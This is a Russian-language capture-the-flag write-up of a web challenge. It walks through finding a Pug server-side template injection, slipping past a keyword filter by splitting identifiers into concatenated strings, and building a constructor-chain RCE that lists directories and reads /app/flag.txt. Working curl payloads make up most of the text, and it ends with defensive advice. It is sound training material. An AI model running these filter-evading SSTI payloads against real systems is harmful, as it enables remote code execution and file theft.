# Writeup: «Тихая касса» (Web)

**Цель:** `http://62.173.140.174:16086`
**Категория:** Web
**Формат флага:** `CODEBY{...}`

## Описание задания

> Веб-приложение для чеков. Иногда показывает больше, чем задумано.

Название и описание намекают на утечку лишней информации — где-то приложение отдаёт больше, чем должно.

## 1. Разведка

Открываем главную страницу — простой сайт "HackerLab" со ссылками:

- `/` — главная
- `/docs-server/receipt?email=guest` — страница "Receipt Service"

Заголовки ответа показывают `X-Powered-By: Express`, то есть бэкенд на Node.js/Express.

Страница `/docs-server/receipt` при любом значении `email` возвращает статичный HTML с текстом:

```
Receipt sent to: strong= email
```

Это подозрительно — выглядит как **нескомпилированный код шаблонизатора Pug (Jade)**: строка `strong= email` — это ровно то, как в Pug записывается тег `<strong>` с выводом переменной `email` (`strong= email` → `<strong>{email}</strong>`). Похоже на "утёкший" фрагмент шаблона, но сама страница не уязвима — значение `email` тут никак не влияет на вывод, это декой, который просто указывает на используемый на бэкенде шаблонизатор.

Дальше проверяем стандартные пути и в первую очередь `robots.txt` — классическое место для случайно оставленных подсказок/эндпоинтов:

```bash
curl -s http://62.173.140.174:16086/robots.txt
```

```
User-agent: *
Disallow: /admin
Allow: /
# Try /preview?tpl=...
```

Комментарий в `robots.txt` прямо указывает на эндпоинт `/preview?tpl=`. `/admin` в `Disallow` — тоже интересная зацепка, но в данном случае решающим оказался именно `/preview`.

## 2. Обнаружение SSTI

Пробуем `/preview?tpl=test`:

```bash
curl -s "http://62.173.140.174:16086/preview?tpl=test"
# <test></test>
```

Значение параметра `tpl` **компилируется как исходник шаблона Pug** и рендерится напрямую — сервер не подставляет `tpl` как переменную в готовый шаблон, а использует его как сам шаблон. Это подтверждается серией тестов:

| `tpl` | Ответ | Что это значит |
|---|---|---|
| `a-b` | `<a-b></a-b>` | обычное имя тега |
| `a.b` | `<a class="b"></a>` | Pug-сокращение `тег.класс` |
| `a/b` | `<a/><b></b>` | синтаксис самозакрывающегося тега |
| `#{7*7}` | `<49></49>` | **JS-выражение внутри `#{}` вычисляется на сервере** |

Последний тест — подтверждение **Server-Side Template Injection (SSTI)**: сервер выполняет произвольный JavaScript-код внутри `#{...}`, а не просто экранирует/выводит текст. Это самое важное открытие всего задания — дальше остаётся только эскалировать это в чтение файлов на сервере.

Полезно сразу переключиться с "голого" `#{}` (который используется как имя тега и ограничен допустимыми символами тега) на форму `|#{...}` — вертикальная черта в начале строки Pug означает "литеральный текстовый блок", и результат выражения просто выводится как текст, без обёртки в HTML-тег:

```bash
curl -s -G "http://62.173.140.174:16086/preview" --data-urlencode "tpl=|#{1+1}"
# 2
```

Это даёт куда более удобный и предсказуемый вывод для дальнейшей эксплуатации.

## 3. Обход фильтра ключевых слов (WAF)

Приложение защищено rate-limiter'ом: при частых запросах к `/preview` вместо ответа приходит

```
Too many requests, please try again later
```

Это не связано с уязвимостью, просто защита от перебора, но заметно замедляет тестирование. Удобный способ не терять время на ручные повторы — опрашивать эндпоинт в цикле, пока ответ не станет отличным от сообщения о лимите:

```bash
until resp=$(curl -s -G "http://62.173.140.174:16086/preview" --data-urlencode "tpl=ВАШ_PAYLOAD"); \
  [ "$resp" != "Too many requests, please try again later" ]; do
  sleep 5
done
echo "$resp"
```

Прямая попытка получить переменные окружения:

```bash
curl -s -G "http://62.173.140.174:16086/preview" --data-urlencode "tpl=|#{process.env.FLAG}"
```

вернула `Forbidden content` — это уже не rate-limit, а именно блокировка контента. Значит, помимо rate-limiter'а есть **фильтр по ключевым словам** (наивный substring-match по сырой, ещё не выполненной строке запроса).

Точечная проверка отдельных слов (`tpl=|#{process}`, `tpl=|#{global}` и т.д.) показала, что как **целые подстроки** блокируются как минимум:

- `process`
- `global`
- `require`
- `mainModule`
- `Module`

При этом простое разбиение слова через конкатенацию строк **обходит** фильтр, потому что он ищет точное совпадение в исходном тексте запроса, а не в результате выполнения JS:

```bash
curl -s -G "http://62.173.140.174:16086/preview" --data-urlencode "tpl=|#{'proc'+'ess'}"
# process   (фильтр пропустил)
```

Важный нюанс, на который стоит обратить внимание: если хотя бы **одна из "частей" сама по себе совпадает с запрещённым словом**, фильтр всё равно сработает. Например, `'main'+'Module'` был заблокирован — потому что кусок `'Module'` сам по себе целиком является запрещённым словом. Раздробить пришлось мельче: `'main'+'Mod'+'ule'`. Отсюда практический вывод: любое потенциально "чувствительное" слово в payload'е стоит превентивно разбивать минимум на 2–3 куска, а не полагаться на то, что фильтр проверяет только самые очевидные слова целиком.

Также стоит иметь в виду, что сообщение `Forbidden content` могло теоретически означать и обычную runtime-ошибку (например, обращение к несуществующему свойству), а не только срабатывание фильтра — это стоит проверять отдельно (например, через `typeof`), чтобы не спутать "заблокировано WAF" с "код просто упал с ошибкой".

## 4. Построение цепочки RCE

Классический трюк для получения доступа к глобальным объектам Node.js из "песочницы" шаблонизатора — получить конструктор `Function` через цепочку `.constructor` от любого простого объекта (например, пустого массива), и с его помощью выполнить произвольный код в глобальной области видимости, откуда доступен `process`:

```js
[]['constructor']['constructor']('return process')()
```

А дальше через `process.mainModule.require(...)` можно получить доступ к любому встроенному Node.js модулю, в частности `fs` — для работы с файловой системой:

```js
[]['constructor']['constructor']('return process')()
  .mainModule.require('fs')
```

Как показано в разделе 3, все "чувствительные" идентификаторы нужно разбивать на конкатенации строк, чтобы обойти substring-фильтр:

```js
[]['constr'+'uctor']['constr'+'uctor']('return proc'+'ess')()
  ['main'+'Mod'+'ule']['requi'+'re']('fs')
```

Перед тем как переходить к файловой системе, стоит проверить саму цепочку на чём-то безобидном и легко проверяемом — например, вывести версию Node.js:

```bash
curl -s -G "http://62.173.140.174:16086/preview" \
  --data-urlencode "tpl=|#{[]['constr'+'uctor']['constr'+'uctor']('return proc'+'ess')().version}"
# v18.20.8
```

Успешный ответ подтверждает, что RCE реально работает. `process.env.FLAG` при этом оказался пустым — значит, флаг лежит не в переменной окружения, а где-то в файловой системе, и нужно переходить к чтению файлов через `fs`.

## 5. Поиск и чтение флага

Имея доступ к `fs`, сначала листим корень контейнера (`readdirSync`), чтобы понять, с чем вообще имеем дело:

```bash
curl -s -G "http://62.173.140.174:16086/preview" \
  --data-urlencode "tpl=|#{[]['constr'+'uctor']['constr'+'uctor']('return proc'+'ess')()['main'+'Mod'+'ule']['requi'+'re']('fs').readdirSync('/').join(',')}"
# .dockerenv,app,bin,dev,etc,home,lib,media,mnt,opt,proc,root,run,sbin,srv,sys,tmp,usr,var
```

Стандартная структура Docker-контейнера, каталог с приложением — `/app`. Листим его тем же способом:

```bash
curl -s -G "http://62.173.140.174:16086/preview" \
  --data-urlencode "tpl=|#{[]['constr'+'uctor']['constr'+'uctor']('return proc'+'ess')()['main'+'Mod'+'ule']['requi'+'re']('fs').readdirSync('/app').join(',')}"
# flag.txt,node_modules,package-lock.json,package.json,public,robots.txt,src,views
```

`flag.txt` лежит прямо в корне приложения. Читаем его через `readFileSync` (слово тоже раздроблено на части по той же логике, что и в разделе 3, — иначе фильтр сработает и здесь). Из-за rate-limiter'а команду лучше сразу оборачивать в цикл ожидания из раздела 3:

```bash
until resp=$(curl -s -G "http://62.173.140.174:16086/preview" \
  --data-urlencode "tpl=|#{[]['constr'+'uctor']['constr'+'uctor']('return proc'+'ess')()['main'+'Mod'+'ule']['requi'+'re']('fs')['readFile'+'Sync']('/app/flag.txt','utf8')}"); \
  [ "$resp" != "Too many requests, please try again later" ]; do
  sleep 5
done
echo "$resp"
```

Ответ будет содержать строку вида `CODEBY{...}` — это и есть флаг.

## Выводы / рекомендации по защите

1. **Никогда не компилировать пользовательский ввод как исходный код шаблона.** Pug/EJS/Handlebars и т.п. не должны получать сырые данные пользователя в качестве шаблона — только как переменные для подстановки (`res.render('name', {data: userInput})`), а не как сам шаблон.
2. **Blacklist по ключевым словам — ненадёжная защита.** Любой фильтр, основанный на поиске подстрок в необработанном запросе, обходится тривиальным дроблением строк (`'proc'+'ess'`), конкатенацией через `String.fromCharCode`, юникод-эскейпами и т.д. Правильное решение — sandboxing окружения выполнения шаблона (например, отключение JS-выражений в Pug) или полный отказ от рендеринга пользовательского шаблона.
3. Rate-limiting — полезная мера, но замедляет только атаку, не предотвращает её; в связке с ненадёжным keyword-фильтром он не спасает.
4. Ошибки WAF/фильтра и обычные runtime-ошибки не стоит возвращать одним и тем же сообщением — это затрудняет диагностику атакующему лишь незначительно, зато мешает легитимной отладке и не даёт разработчикам заметить разницу между "заблокировано" и "сломалось".
